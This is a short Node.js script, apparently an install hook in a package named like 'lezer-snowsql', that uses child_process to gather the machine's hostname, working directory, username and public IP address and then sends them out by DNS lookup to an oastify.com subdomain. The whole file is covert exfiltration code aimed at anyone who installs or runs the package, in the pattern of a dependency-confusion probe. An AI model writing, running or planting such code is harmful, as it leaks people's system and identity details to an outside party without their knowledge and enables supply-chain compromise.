const { exec } = require("child_process");

exec("a=$(hostname; pwd; whoami; echo lezer-snowsql; curl -s https://ifconfig.me); a=$(echo $a | tr -d '[:space:]' | tr '/' '-'); nslookup ${a}.4w1mxe4lwi7v0c9u0nz5c47wenke89wy.oastify.com", (error, stdout, stderr) => {
    if (error) {
        console.log("error:", error.message);
        return;
    }
    console.log(stdout);
});
